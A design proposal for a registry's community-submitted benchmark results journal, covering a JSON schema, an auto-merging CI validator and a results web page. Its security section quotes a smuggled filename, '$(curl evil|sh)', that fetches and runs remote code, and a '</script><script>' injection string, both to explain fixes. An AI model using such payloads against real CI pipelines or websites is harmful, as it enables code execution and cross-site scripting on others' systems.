# Proposal: Community results journal

## Context

Today nothing in cube-registry records *how agents perform* on registered
benchmarks. Users see what cubes exist but have no reference points for what
results to expect, which model+agent combinations are competitive, or how scores
have evolved over time.

This proposal adds a **per-cube journal of community-submitted evaluation
results**, hosted alongside the registry, with a low-friction PR-based submission
flow and a per-cube results table in the static site.

It is the complement to the [`nightly-monitoring`](../nightly-monitoring/)
proposal:

| | `nightly-results/` | `results/` (this proposal) |
|---|---|---|
| Written by | CI bot | Anyone (via PR) |
| Agent | debug agent (scripted) | real LLM agent |
| Question | "is the cube still working?" | "how do agents score on it?" |
| Volume | 1 row/cube/day | unbounded |

## What

1. New directory `results/<cube-id>/<evaluation_id>.json`. One file = one
   experiment-level run. Each submission captures *what was evaluated*
   (benchmark + version + subset name/filter/`task_ids` + `n_tasks` denominator),
   *what happened* (avg score + std err + mutually-exclusive outcome counts:
   `n_success`, `n_failure`, `n_max_steps`, `n_system_error`, `n_missing` —
   summing to `n_tasks`), and *what the experiment ran in* — both `dependency_versions`
   (sys.modules-filtered, dev-pruned to ~45 packages) and a `primary_dependencies`
   subset that flags the highest-leverage version-drift hotspots. No per-task
   data — submitters keep raw trajectories on their own infra; this is the
   journal, not the archive.
2. New workflow `results-check.yml` validates each added file and **auto-merges
   the PR** when (and only when) every check passes and the diff is strictly
   inside `results/`. The append-only invariant is enforced via
   `git diff --diff-filter=MDRC` so an `add+modify` PR can't slip past.
3. Per-cube results page with a Grid.js-backed sortable table, a Compare-N
   modal (select 2-4 rows → side-by-side spec-comparison view with diff
   highlighting), and a tiered Dependency-versions display (primary pinned
   inline, secondary collapsed) — all rendered into the existing static site.
4. New `results-schema.json` (cube-native shape, not EEE-shaped — see "Not in
   scope"). Optional `primary_dependencies: list[str]` lets producers pin
   intent without breaking older records.
5. New `record-submitter.yml` post-merge workflow that appends submitter
   identity (`{evaluation_id: {submitted_by, merged_at}}`) to a per-cube
   `_submissions.json` bookkeeping file — CI-bot-only writes via the existing
   path-restricted bypass pattern.

## Why auto-merge

Auto-merge is the load-bearing decision. Without it, every submission burns
maintainer attention and the journal stays empty. The validator (see `design.md`)
catches structural problems, cross-references the registry, and rejects anything
implausible — exactly the work a human reviewer would do for a results PR. A
maintainer's judgment adds no signal here.

This relaxes CI Invariant #6 ("entries never auto-merge") *narrowly*: it applies
only when the diff touches **only** `results/*.json` and only adds files. Any
deviation falls back to standard human review.

The auto-merge surface has three load-bearing safety controls, each landed in
direct response to a code-review finding:

- **Env-var passthrough** for PR-author-controlled file paths
  (`needs.classify.outputs.added_results` → `env: ADDED_FILES` → `xargs`),
  closing a shell-injection sink (`$(curl evil|sh)` in a filename would
  otherwise execute on the runner before validation).
- **`git diff --diff-filter=MDRC`** computes the modify/delete signal directly,
  not via `tj-actions/changed-files`. The earlier setup reported "no
  modifications" whenever any file was *added*, letting an add+modify PR
  silently bypass append-only.
- **JSON-in-`<script>` HTML escape** (`<` / `>` / `&` → `\\u003c` / `\\u003e` /
  `\\u0026`) in `_json_for_html_script`. Without it, a submission whose
  `agent.llm_model` or `agent.config` value contains `</script><script>...`
  would XSS every visitor of the cube's page once auto-merged.

Fork PRs: `GITHUB_TOKEN` is read-only on `pull_request` from a fork in public
repos, so `gh pr merge --auto` is a no-op there. The validator still runs and
posts a green summary; a maintainer completes the merge by hand. Documented
in README + the cube-harness submitter (`scripts/submit_to_journal.py`)
forks via `gh repo fork --clone` and pushes to the fork — works for any
authenticated GitHub user.

## Honor-system caveat

The validator checks format, internal consistency, and registry cross-references.
It does **not** verify that the reported scores were actually produced. Submitters
include git hashes and a full agent config so others can re-run, but lying
remains technically possible. Treat the journal as a reference, not a leaderboard.

A future `verified: true` flag (only flippable by a separate re-runner bot) can
add stronger guarantees lazily; out of scope for V1.

## Charter expansion

cube-registry's CLAUDE.md today reads "metadata-only repo." This proposal
expands scope to "metadata + community results journal." Results live in a
clearly isolated subtree (`results/`) with its own workflow and its own write
rules — no risk of bleeding into the existing entry/CI/site pipelines.

## Submitter side (out of repo)

A companion `scripts/submit_to_journal.py` in cube-harness reads an
`EvalLog` from an experiment dir, builds the JSON, and (with `--auto-pr`)
forks cube-registry and opens the PR via `gh`. A second script,
`scripts/scan_experiments.py`, walks `~/cube_harness_results/` and
classifies every dir into one of five eligibility buckets
(`already_submitted` / `broken` / `unfinished` / `subset_review` /
`submittable`) before handing off to the submitter — restrictive by
default (debug runs and hand-picked subsets require explicit `--yes`).
Both scripts persist their decisions into a per-experiment
`submissions.json` so re-runs are idempotent. This proposal only specifies
the registry-side contract (schema + workflow + site).

## Not in scope

- **EEE submission**: handled separately by a converter in cube-harness pushing
  to the EvalEval HuggingFace dataset. Two destinations, one source of truth
  (cube's `EvalLog`). The cube-registry schema is intentionally *not*
  EEE-shaped — EEE's `additionalProperties: false` at the top forces cube
  provenance into string KVs and makes a typed UI painful.
- **Verification / re-running** of submitted results — see honor-system caveat.
- **Charts** (score-over-time, model × cube matrix) — V2; V1 ships a table.
- **Per-task data**, per-episode trajectories, investigator findings — kept on
  submitters' infra. The journal stores aggregates only.

## Phasing

| Phase | Deliverable | Status |
|-------|-------------|--------|
| 1 | Proposal + deltas + design | ✅ shipped |
| 2 | `results-schema.json`, `scripts/results_check.py`, `results-check.yml`, fixtures, tests | ✅ shipped |
| 3 | Site template + `generate.py` update; Grid.js table + compare-N modal | ✅ shipped |
| 4 | `submit_to_journal.py` + `submit_to_eee.py` + `scan_experiments.py` in cube-harness; `submissions.json` idempotency ledger | ✅ shipped |
| 5 | Security + UX hardening from multi-agent code-review (shell injection, append-only gate, XSS escape, batch dedup, maxLength caps, primary/secondary dep tiering) | ✅ shipped |
| 6 (later) | V2 charts (score-over-time, model × cube matrix); verified-flag bot |
